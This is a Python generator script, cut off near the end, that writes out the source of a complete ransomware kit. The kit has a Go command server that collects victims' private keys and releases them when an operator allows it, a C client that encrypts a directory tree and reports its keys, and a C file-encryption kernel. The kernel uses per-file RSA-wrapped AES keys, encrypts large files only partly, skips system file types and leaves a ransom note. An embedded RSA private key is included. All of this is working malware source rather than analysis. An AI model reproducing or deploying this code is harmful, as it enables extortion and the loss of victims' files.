SERVER_FNAME = "server.go"
CLIENT_FNAME = "encrypter.c"

CRYPTO_FNAME = "crypto.go"
DTBASE_FNAME = "database.go"
KERNEL_FNAME = "enckernel.c"

URL_ACTION = "/cmd"
PATH_TO_ENCRYPT = "./test"

IS_SOCKS5_CONNECT = False
IS_ENCRYPT_MODE = True

WITH_README = True
WITH_BLOCK_EXTENSIONS = True
WITH_INCOMPLETE_ENCRYPTION = True

README_FILE = "__README__"
README_TEXT = "hello, friend"
KEY_EXTENSION = ".key"
BLOCK_EXTENSIONS = [".exe", ".dll", ".bat", ".ini", ".sys"]
MAX_FSIZE_WITHOUT_INCOMPLETE_ENCRYPTION = (8 << 20) # 8*(2^20)b = 8MiB

ADDR = "127.0.0.1"
PORT = 8080
SOCKS5_PORT = 9050

PRIVATE_KEY = """-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----"""

PUBLIC_KEY = """-----BEGIN RSA PUBLIC KEY-----\\n"
"MIICCgKCAgEAtyGmMa66N4dSVSaT0bBKgGC7Bb6Jt6TXpXItRPADg2X/gQjj8u8q\\n"
"Vj+MIvjxi+J1sgiLMVlQPvBlgpmw3sKkDMiGRdKQtETu54Yw77ejZbk+WiICtbdn\\n"
"JYp33rWAUY1+FfXWh5C0WwcDQ5KKVHi2ij7+JctxMlp4jafWWDSZ1V5z7Cj7WxW2\\n"
"RfymV+C1qWgVYptiIgXnnP8qAkxUGenCOLvz0zTUUZTJkSLBWdHyy6jSw20dIwAU\\n"
"E+kTl9Rxmv28e99f7dRAs65s52djlDYObcYPxVNx2A9p/3D4oM+p+ySJEDlGMTFZ\\n"
"l/PTUgZZd34KNqXFwuy6OkmqIB750OoqjlD2qDQ3hM9dQQxBPYrumK03l5Wdzw+L\\n"
"jA7a5l5M5ON7ieXjg6OonrYUlXXeteIIwOkByMXmxdvTlBhsOSW7OKO+XqhIpaKc\\n"
"wpCuosYmue8QbTeGCFTtsejcNwMSnbXY5QOt6u1E7C0JIE8vagePKaxj8pVCEvXG\\n"
"VLXXeNZD2HKlocgeJwM6ZWcvEtrnGNh+EaT1dNKybmwYRyllGxPiEx/DjDYF8Wvd\\n"
"wofBmiQwEXnsBzHhUHduXhucuFTIQtTD3EbwazRnMH9yoa1a57JaKCN/j/RhP9aJ\\n"
"pdIdlfX+NxNIwSf/IM5T3jS/IdwFbX2IIhzMOIATRzewnkgh6k6IcR8CAwEAAQ==\\n"
"-----END RSA PUBLIC KEY-----\\n"""

def return_extensions(exts) -> str:
	res = "{"
	for i in range(len(exts)-1):
		res += f"\"{exts[i]}\","
	res += f"\"{exts[-1]}\""
	res += "}"
	return res

def main():
	with open(SERVER_FNAME, "w") as file:
		file.write(SERVER_CODE)

	with open(CLIENT_FNAME, "w") as file:
		file.write(CLIENT_CODE)

	with open(CRYPTO_FNAME, "w") as file:
		file.write(CRYPTO_CODE)

	with open(DTBASE_FNAME, "w") as file:
		file.write(DTBASE_CODE)

	with open(KERNEL_FNAME, "w") as file:
		file.write(KERNEL_CODE)

SERVER_CODE = """
package main

import (
	"bufio"
	"crypto/rsa"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strconv"
	"strings"
)

var (
	DBptr *DB
	PRIV *rsa.PrivateKey
)

func init() {
	DBptr = DBInit("database.db")
	PRIV = ParsePrivate([]byte(PemPrivateKey))
	if DBptr == nil || PRIV == nil {
		panic("init error")
	}
}

func main() {
	fmt.Println("Server is listening...\\n")
	go adminConsole()
	http.HandleFunc("/", indexPage)
	http.HandleFunc(""" + f"\"{URL_ACTION}\"" + """, cmdPage)
	http.ListenAndServe(""" + f"\":{PORT}\"" + """, nil)
}

func help() string{
	return `
1. exit // exit from program
2. help // help info for commands
3. size // number of users in DB
4. list // list of users in DB
5. info // user info by ID
6. allw // allow access mode by ID
7. deny // deny access mode by ID
`
}

func adminConsole() {
	var (
		message string
		splited []string
	)
	for {
		message = inputString("> ")
		splited = strings.Split(message, " ")
		switch splited[0] {
		case "exit":
			os.Exit(0)
		case "help":
			fmt.Println(help())
		case "size":
			fmt.Printf("Size: %d\\n\\n", DBptr.Size())
		case "list":
			for i := 1; ; i++ {
				user := DBptr.GetUserByID(i)
				if user == nil {
					break
				}
				fmt.Printf("%d: %s\\n", user.Id, user.Uid)
			}
			fmt.Println()
		case "info":
			if len(splited) != 2 {
				fmt.Println("error: not enough args")
				continue
			}
			id, err := strconv.Atoi(splited[1])
			if err != nil {
				fmt.Println("error: strconv")
				continue
			}
			user := DBptr.GetUserByID(id)
			if user == nil {
				fmt.Println("error: user undefined\\n")
				continue
			}
			fmt.Printf(
				"\\nID: %d\\nUID: %s\\nACCESS: %t\\nPRIV_KEY: \\n%s\\n\\n",
				user.Id,
				user.Uid,
				user.Access,
				user.PrvKey,
			)
		case "allw", "deny": 
			var err error
			if len(splited) != 2 {
				fmt.Println("error: not enough args")
				continue
			}
			switch splited[0] {
			case "allw": err = DBptr.UpdateAccess(splited[1], true)
			case "deny": err = DBptr.UpdateAccess(splited[1], false)
			}
			if err != nil {
				fmt.Printf("error: %s\\n\\n", err.Error())
				continue
			}
			fmt.Println("access mode has been updated\\n")
		default:
			fmt.Println("error: command undefined\\n")
		}
	}
}

func inputString(begin string) string {
	fmt.Print(begin)
	msg, _ := bufio.NewReader(os.Stdin).ReadString('\\n')
	return strings.Replace(msg, "\\n", "", 1)
}

func indexPage(w http.ResponseWriter, r *http.Request) {
	response(w, 0, "success: action completed")
}

func cmdPage(w http.ResponseWriter, r *http.Request) {
	var req struct {
		Head string `json:"head"`
		Body []string `json:"body"`
	}

	if r.Method != "POST" {
		response(w, 1, "error: method != POST")
		return
	}
	
	err := json.NewDecoder(r.Body).Decode(&req)
	if err != nil {
		response(w, 2, "error: parse json")
		return
	}

	result := ""

	switch req.Head {
	case "/PUT":
		ok := putPage(req.Body)
		if !ok {
			response(w, 3, "error: put page")
			return
		}
		result = "success: action completed"

	case "/GET":
		priv, ok := getPage(req.Body)
		if !ok {
			response(w, 3, "error: get page")
			return
		}
		result = HexEncode(BytesPrivate(priv))

	default: 
		response(w, 4, "error: page undefined")
		return
	}

	response(w, 0, result)
}

func getPage(body []string) (*rsa.PrivateKey, bool) {
	if len(body) != 1 {
		return nil, false
	}

	uid := body[0]

	priv := DBptr.GetKey(uid) 
	if priv == nil {
		return nil, false
	}

	return priv, true 
}

func putPage(body []string) bool {
	const (
		ASIZE = 256
		KSIZE = 32
	)

	if len(body) != 2 {
		return false
	}

	encSkey := HexDecode(body[0])
	if (encSkey == nil) {
		return false
	}

	encPkey := HexDecode(body[1])
	if (encPkey == nil) {
		return false
	}

	decSkey := DecryptRSA(PRIV, encSkey)
	if (decSkey == nil) {
		return false
	}

	decPkey := DecryptAES(decSkey, encPkey)
	if (decPkey == nil) {
		return false
	}

	priv := ParsePrivate(decPkey)
	if priv == nil {
		return false
	}

	if priv.N.BitLen() != ASIZE*8 {
		return false
	}

	uid  := HashPublic(&priv.PublicKey)
	DBptr.SetKey(uid, priv)

	return true 
}

func response(w http.ResponseWriter, ret int, res string) {
	w.Header().Set("Content-Type", "application/json")
	var resp struct {
		Return int    `json:"return"`
		Result string `json:"result"`
	}
	resp.Return = ret
	resp.Result = res
	json.NewEncoder(w).Encode(resp)
}

const (
	PemPrivateKey = `""" + f"{PRIVATE_KEY}" + """
`
)
"""

CLIENT_CODE = """
#include "extclib/crypto.h"
#include "extclib/net.h"

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>

#define ENCRYPT_MODE  1
#define DECRYPT_MODE -1

""" + ("#define OPTION ENCRYPT_MODE" if IS_ENCRYPT_MODE else "#define OPTION DECRYPT_MODE") + """

#define BUFSIZ_1K (1 << 10)
#define BUFSIZ_2K (2 << 10)
#define BUFSIZ_4K (4 << 10)
#define BUFSIZ_8K (8 << 10)

#define ENCPATH """ + f"\"{PATH_TO_ENCRYPT}\"" + """
#define ADDRESS """ + (f"\"{ADDR}\", {PORT}, {SOCKS5_PORT}" if IS_SOCKS5_CONNECT else f"\"{ADDR}\", {PORT}") + """

#if OPTION != ENCRYPT_MODE && OPTION != DECRYPT_MODE
	#error "option undefined"
#endif

extern int path_encrypt(int mode, const char *pathname, crypto_rsa *key);
extern int file_encrypt(int mode, const char *pathname, const char *filename, const uint8_t *key);

#if OPTION == ENCRYPT_MODE
	static crypto_rsa *generate_encrypted_keys(const char *pempub, char *outskey, char *outpriv);
	static const char *pem_public_key = \"""" + f"{PUBLIC_KEY}" + """\";
#endif

int main(int argc, char const *argv[]) {
	char buffer[BUFSIZ_8K];
	net_conn *conn;
	crypto_rsa *key;

try_conn:
	/* create connection */
	conn = """ + ("net_socks5_connect(ADDRESS);" if IS_SOCKS5_CONNECT else "net_connect(ADDRESS);") + """
	if (conn == NULL) {
		sleep(5);
		goto try_conn;
	}

#if OPTION == ENCRYPT_MODE
	char encseskey[BUFSIZ_2K];
	char encprvkey[BUFSIZ_4K];

	/* generate and encrypt private, session keys
	return public key */
	key = generate_encrypted_keys(pem_public_key, encseskey, encprvkey);

	/* send encrypted keys */
	snprintf(buffer, BUFSIZ_8K, "{\\"head\\":\\"/PUT\\", \\"body\\":[\\"%s\\", \\"%s\\"]}", encseskey, encprvkey);
	net_http_post(conn, """ + f"\"{URL_ACTION}\"" + """, buffer);

	/* encrypt with public key */
	path_encrypt(ENCRYPT_MODE, ENCPATH, key);

#elif OPTION == DECRYPT_MODE
	char hexprvkey[BUFSIZ_4K];
	char pemprvkey[BUFSIZ_2K];

	char *ptr;
	int ret;

	if (argc < 2) {
		fprintf(stderr, "run example: ./decrypter uid\\n");
		return 1;
	}

	/* download private key */
	snprintf(buffer, BUFSIZ_8K, "{\\"head\\":\\"/GET\\", \\"body\\":[\\"%s\\"]}", argv[1]);
	net_http_post(conn, """ + f"\"{URL_ACTION}\"" + """, buffer);
	ret = net_recv(conn, buffer, BUFSIZ_8K-1);
	buffer[ret] = '\\0';

	/* pass http headers */
	ptr = strstr(buffer, "{");
	if (ptr == NULL) {
		fprintf(stderr, "error: not found '{'\\n");
		return 2;
	}

	char inputs[BUFSIZ_1K];
	sprintf(inputs, "{\\"return\\":%%d,\\"result\\":\\"%%%d[^\\"]\\"}", BUFSIZ_4K-1);

	/* parse json */
	ret = -1;
	sscanf(ptr, inputs, &ret, hexprvkey);
	if (ret != 0) {
		fprintf(stderr, "error: return code = %d\\n", ret);
		return 3;
	}

	/*  load private key */
	crypto_hex(DECRYPT_MODE, pemprvkey, BUFSIZ_2K, hexprvkey, strlen(hexprvkey));
	key = crypto_rsa_loadprv(pemprvkey);

	/* start decrypt */
	path_encrypt(DECRYPT_MODE, ENCPATH, key);

#endif
	crypto_rsa_free(key);
	net_close(conn);
	return 0;
}

#if OPTION == ENCRYPT_MODE
	// encrypt_keys returns [public_key]
	// outpriv = hex(encrypt(private_key))
	// outskey = hex(encrypt(session_key))
	static crypto_rsa *generate_encrypted_keys(const char *pempub, char *outskey, char *outpriv) {
		const int ASIZE = 256;
		const int KSIZE = 32;
		const int BSIZE = 16;

		char buffer[BUFSIZ_2K];
		char asmkey[BUFSIZ_2K];

		char iv[BSIZE];
		char seskey[KSIZE];

		crypto_rsa *pub, *priv;

		pub = crypto_rsa_loadpub(pempub);
		priv = crypto_rsa_new(ASIZE*8);

		/* rand(iv), rand(seskey) */
		crypto_rand(iv, BSIZE);
		crypto_rand(seskey, KSIZE);

		/* outskey = hex(encrypt(mainpub, seskey)) */
		crypto_rsa_oaep(ENCRYPT_MODE, pub, buffer, BUFSIZ_2K, seskey, KSIZE);
		crypto_hex(ENCRYPT_MODE, outskey, BUFSIZ_2K, buffer, crypto_rsa_size(pub));

		/* convert priv to string */
		crypto_rsa_storeprv(asmkey, BUFSIZ_2K, priv);
		size_t len = strlen(asmkey);
		size_t padding = BSIZE - (len % BSIZE);

		/* outpriv = hex(encrypt(seskey, priv)) */
		memcpy(buffer, iv, BSIZE);
		crypto_aes_256cbc(ENCRYPT_MODE, seskey, buffer+BSIZE, asmkey, strlen(asmkey), iv);
		crypto_hex(ENCRYPT_MODE, outpriv, BUFSIZ_4K, buffer, len+padding+BSIZE);

		/* clear data */
		crypto_rand(asmkey, BUFSIZ_2K);
		crypto_rand(seskey, KSIZE);

		/* convert pub to string */
		crypto_rsa_storepub(asmkey, BUFSIZ_2K, priv);

		/* clear keys */
		crypto_rsa_free(priv);
		crypto_rsa_free(pub);

		return crypto_rsa_loadpub(asmkey);
	}
#endif
"""

CRYPTO_CODE = """
package main 

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha1"
	"crypto/sha256"
	"crypto/x509"
	"encoding/hex"
	"encoding/pem"
)

func HexEncode(data []byte) string {
	return hex.EncodeToString(data)
}

func HexDecode(data string) []byte {
	res, err := hex.DecodeString(data)
	if err != nil {
		return nil
	}
	return res
}

func DecryptRSA(priv *rsa.PrivateKey, data []byte) []byte {
	data, err := rsa.DecryptOAEP(sha1.New(), rand.Reader, priv, data, nil)
	if err != nil {
		return nil
	}
	return data
}

func DecryptAES(key, data []byte) []byte {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil
	}
	blockSize := block.BlockSize()
	if len(data) < blockSize {
		return nil
	}
	iv := data[:blockSize]
	data = data[blockSize:]
	if len(data)%blockSize != 0 {
		return nil
	}
	mode := cipher.NewCBCDecrypter(block, iv)
	mode.CryptBlocks(data, data)
	return unpaddingPKCS5(data)
}

func unpaddingPKCS5(origData []byte) []byte {
	length := len(origData)
	if length == 0 {
		return nil
	}
	unpadding := int(origData[length-1])
	if length < unpadding {
		return nil
	}
	return origData[:(length - unpadding)]
}

func ParsePrivate(privData []byte) *rsa.PrivateKey {
	block, _ := pem.Decode(privData)
	if block == nil {
		return nil
	}
	priv, err := x509.ParsePKCS1PrivateKey(block.Bytes)
	if err != nil {
		return nil
	}
	return priv
}

func BytesPrivate(priv *rsa.PrivateKey) []byte {
	bytes := x509.MarshalPKCS1PrivateKey(priv)
	privData := pem.EncodeToMemory(
		&pem.Block{
			Type:  "RSA PRIVATE KEY",
			Bytes: bytes,
		},
	)
	return privData
}

func BytesPublic(pub *rsa.PublicKey) []byte {
	bytes := x509.MarshalPKCS1PublicKey(pub)
	pubData := pem.EncodeToMemory(
		&pem.Block{
			Type:  "RSA PUBLIC KEY",
			Bytes: bytes,
		},
	)
	return pubData
}

func HashPublic(pub *rsa.PublicKey) string {
	return HexEncode(HashSum(BytesPublic(pub)))
}

func HashSum(data []byte) []byte {
	hash := sha256.Sum256(data)
	return hash[:]
}
"""

DTBASE_CODE = """
package main

import (
	"sync"
	"crypto/rsa"
	"database/sql"
	_ "github.com/mattn/go-sqlite3"
)

type DB struct {
	ptr *sql.DB
	mtx sync.Mutex
}

type User struct {
	Id int
	Access bool
	Uid string
	PrvKey string
}

func DBInit(filename string) *DB {
	db, err := sql.Open("sqlite3", filename)
	if err != nil {
		return nil
	}
	_, err = db.Exec(`
CREATE TABLE IF NOT EXISTS users (
	id INTEGER,
	access BOOLEAN,
	uid VARCHAR(255) UNIQUE,
	prvkey VARCHAR(4096),
	PRIMARY KEY(id)
);
`)
	if err != nil {
		return nil
	}
	return &DB{
		ptr: db,
	}
}

func (db *DB) UpdateAccess(id string, mode bool) error {
	db.mtx.Lock()
	defer db.mtx.Unlock()
	_, err := db.ptr.Exec(
		"UPDATE users SET access=$1 WHERE id=$2",
		mode,
		id,
	)
	return err
}

func (db *DB) GetUserByID(id int) *User {
	db.mtx.Lock()
	defer db.mtx.Unlock()
	var (
		access bool
		uid string
		prvkey string
	)
	row := db.ptr.QueryRow(
		"SELECT access, uid, prvkey FROM users WHERE id=$1",
		id,
	)
	row.Scan(&access, &uid, &prvkey)
	if prvkey == "" {
		return nil
	}
	return &User{
		Id: id,
		Access: access,
		Uid: uid,
		PrvKey: string(HexDecode(prvkey)),
	}
}

func (db *DB) Size() int {
	db.mtx.Lock()
	defer db.mtx.Unlock()
	var id int
	row := db.ptr.QueryRow(
		"SELECT id FROM users ORDER BY id DESC LIMIT 1",
	)
	row.Scan(&id)
	return id
}

func (db *DB) SetKey(uid string, key *rsa.PrivateKey) error {
	db.mtx.Lock()
	defer db.mtx.Unlock()
	_, err := db.ptr.Exec(
		"INSERT INTO users (access, uid, prvkey) VALUES ($1, $2, $3)", 
		0,
		uid, 
		HexEncode(BytesPrivate(key)),
	)
	return err
} 

func (db *DB) GetKey(uid string) *rsa.PrivateKey {
	db.mtx.Lock()
	defer db.mtx.Unlock()
	var strprv string
	row := db.ptr.QueryRow(
		"SELECT prvkey FROM users WHERE access=1 AND uid=$1",
		uid,
	)
	row.Scan(&strprv)
	return ParsePrivate(HexDecode(strprv))
}
"""

KERNEL_CODE = """
#include "extclib/crypto.h"

#include <stdio.h>
#include <string.h>
#include <stdint.h>

#include <dirent.h>
#include <sys/stat.h>

#include <openssl/rand.h>
#include <openssl/sha.h>
#include <openssl/aes.h>
#include <openssl/evp.h>
#include <openssl/pem.h>
#include <openssl/rsa.h>

/* CONSTS */
#define HSIZE 64
#define KSIZE 32
#define BSIZE 16

#define BUFSIZ_2K (2 << 10)
#define BUFSIZ_4K (4 << 10)

#define ENCRYPT_MODE  1
#define DECRYPT_MODE -1

/* SETTINGS */
""" + ("#define README" if WITH_README else "") + """
""" + ("#define EXTENSIONS" if WITH_BLOCK_EXTENSIONS else "") + """
""" + ("#define INCOMPLETE" if WITH_INCOMPLETE_ENCRYPTION else "") + """

/* PARAMS */
#define README_FILE         """ + f"\"{README_FILE}\"" + """
#define README_TEXT         """ + f"\"{README_TEXT}\"" + """
#define ENCKEY_EXTN         """ + f"\"{KEY_EXTENSION}\"" + """
#define BLOCK_EXTENSIONS    """ + return_extensions(BLOCK_EXTENSIONS) + """
#define LIMIT_FSIZE         """ + f"{MAX_FSIZE_WITHOUT_INCOMPLETE_ENCRYPTION}" + """

extern int path_encrypt(int mode, const char *pathname, RSA *key);
extern int file_encrypt(int mode, const char *pathname, const char *filename, const char *key);

static int _file_encrypt(int mode, FILE *output, FILE *input, const char *key, char *iv);
static int _incmplt_file_encrypt(int mode, const char *fullname, const char *key, size_t fs);
static int _openskeyfile(int mode, const char *pathname, const char *filename, RSA *key, char *skey);
static void _part_file_encrypt(int mode, FILE *fp, size_t begin, char *buffer, const char *key, const char *iv);

static void _tochars(char *output, size_t size);
static _Bool _is_dir(const char *pathname);
static _Bool _file_exist(const char *filename);
static size_t _file_size(const char *filename);

extern int path_encrypt(int mode, const char *pathname, RSA *key) {
#ifdef EXTENSIONS
	const char *extens[] = BLOCK_EXTENSIONS;
#endif
#ifdef README
	FILE *readme;
	char hash[HSIZE+1];
#endif
	DIR *dir;
	size_t fs;
	struct dirent *d;
	char fullname[BUFSIZ_4K];
	char skey[KSIZE];
	_Bool need_pass;

	dir = opendir(pathname);
	if (dir == NULL) {
		return 1;
	}

#ifdef README
	snprintf(fullname, BUFSIZ_4K, "%s/%s", pathname, README_FILE);
	if (mode == ENCRYPT_MODE && !_file_exist(fullname)) {
		crypto_rsa_hashpub(hash, key);
		readme = fopen(fullname, "w");
		if (readme != NULL) {
			fprintf(readme, "%s\\n%s\\n%s\\n\\n%s\\n%s\\n%s\\n\\n", 
				"-----BEGIN UID KEY-----", hash, "-----END UID KEY-----",
				"-----BEGIN MESSAGE-----", README_TEXT, "-----END MESSAGE-----");
			PEM_write_RSAPublicKey(readme, key);
			fclose(readme);
		}
	}   
#endif

	while ((d = readdir(dir)) != NULL) {
		snprintf(fullname, BUFSIZ_4K, "%s/%s", pathname, d->d_name);
		if (_is_dir(fullname)) {
			if (strcmp(d->d_name, ".") == 0 || strcmp(d->d_name, "..") == 0) {
				continue;
			}
			path_encrypt(mode, fullname, key);
			continue;
		}
#ifdef README
		if (strcmp(README_FILE, d->d_name) == 0) {
			continue;
		}
#endif
#ifdef EXTENSIONS
		need_pass = 0;
		for (size_t i = 0; i < sizeof(extens)/sizeof(extens[0]); ++i) {
			if (strstr(d->d_name, extens[i]) != NULL) {
				need_pass = 1;
				break;
			}
		}
		if (need_pass) {
			continue;
		}
#endif
		if (strstr(d->d_name, ENCKEY_EXTN) != NULL) {
			continue;
		}
		need_pass = _openskeyfile(mode, pathname, d->d_name, key, skey);
		if (need_pass) {
			continue;
		}
		fs = _file_size(fullname);
		// printf("[%s][%ldB] %s\\n", (mode) ? "ENCRYPT" : "DECRYPT", fs, fullname);
#ifdef INCOMPLETE
		if (fs > LIMIT_FSIZE) {
			_incmplt_file_encrypt(mode, fullname, skey, fs);
			continue;
		}
#endif
		file_encrypt(mode, pathname, d->d_name, skey);
	}

#ifdef README
	snprintf(fullname, BUFSIZ_4K, "%s/%s", pathname, README_FILE);
	if (mode == DECRYPT_MODE && _file_exist(fullname)) {
		remove(fullname);
	}
#endif
	closedir(dir);
	return 0;
}

extern int file_encrypt(int mode, const char *pathname, const char *filename, const char *key) {
	char tempfile[BUFSIZ_4K];
	char fullname[BUFSIZ_4K];
	char tempname[BSIZE];
	char iv[BSIZE];
	FILE *input, *output;
	int rc;

	snprintf(fullname, BUFSIZ_4K, "%s/%s", pathname, filename);
	input = fopen(fullname, "rb");
	if (input == NULL) {
		return 1;
	}

	crypto_rand(tempname, BSIZE);
	_tochars(tempname, BSIZE);
	tempname[BSIZE-1] = '\\0';

	snprintf(tempfile, BUFSIZ_4K, "%s/%s", pathname, tempname);
	output = fopen(tempfile, "wb");
	if (output == NULL) {
		fclose(input);
		return 2;
	}

	switch (mode) {
		case ENCRYPT_MODE:
			crypto_rand(iv, BSIZE);
			fwrite(iv, sizeof(uint8_t), BSIZE, output);
			rc = _file_encrypt(ENCRYPT_MODE, output, input, key, iv);
		break;
		case DECRYPT_MODE:
			fread(iv, sizeof(uint8_t), BSIZE, input);
			rc = _file_encrypt(DECRYPT_MODE, output, input, key, iv);
		break;
	}
	
	fclose(input);
	fclose(output);

	rename(tempfile, fullname);
	return rc;
}


static int _incmplt_file_encrypt(int mode, const char *fullname, const char *key, size_t fs) {
	char buffer[BUFSIZ_2K];
	char iv[KSIZE];
	FILE *input;
	
	input = fopen(fullname, "rb+");
	if (input == NULL) {
		return 1;
	}

	// memset(iv, 0, BSIZE);
	crypto_sha_256(iv, key, KSIZE);

	// BEGIN: 0
	_part_file_encrypt(mode, input, 0, buffer, key, iv);

	// MIDDLE: F/2, F/4, F/6, F/8
	for (size_t i = 2; i <= 8; i += 2) {
		_part_file_encrypt(mode, input, fs/i, buffer, key, iv);
	}

	// END: F-B
	_part_file_encrypt(mode, input, fs-BUFSIZ_4K, buffer, key, iv);

	fclose(input);
	return 0;
}

static int _openskeyfile(int mode, const char *pathname, const char *filename, crypto_rsa *key, char *skey) {
	FILE *file;
	char enckey[BUFSIZ_4K];
	char buffer[BUFSIZ_2K];
	
	snprintf(enckey, BUFSIZ_4K, "%s/%s%s", pathname, filename, ENCKEY_EXTN);
	switch(mode) {
		case ENCRYPT_MODE:
			if (_file_exist(enckey)) {
				return 1;
			}
			file = fopen(enckey, "wb");
			if (file == NULL) {
				return 1;
			}
			crypto_rand(skey, KSIZE);
			crypto_rsa_oaep(mode, key, buffer, BUFSIZ_2K, skey, KSIZE);
			fwrite(buffer, sizeof(uint8_t), crypto_rsa_size(key), file);
			fclose(file);
		break;
		case DECRYPT_MODE:
			file = fopen(enckey, "rb");
			if (file == NULL) {
				return 1;
			}
			fread(buffer, sizeof(char), crypto_rsa_size(key), file);
			crypto_rsa_oaep(mode, key, buffer, BUFSIZ_2K, buffer, RSA_size(key));
			memcpy(skey, buffer, KSIZE);
			fclose(file);
			remove(enckey);
		break;
	}
	return 0;
}

static void _tochars(char *output, size_t size) {
	for (size_t i = 0; i < size; ++i) {
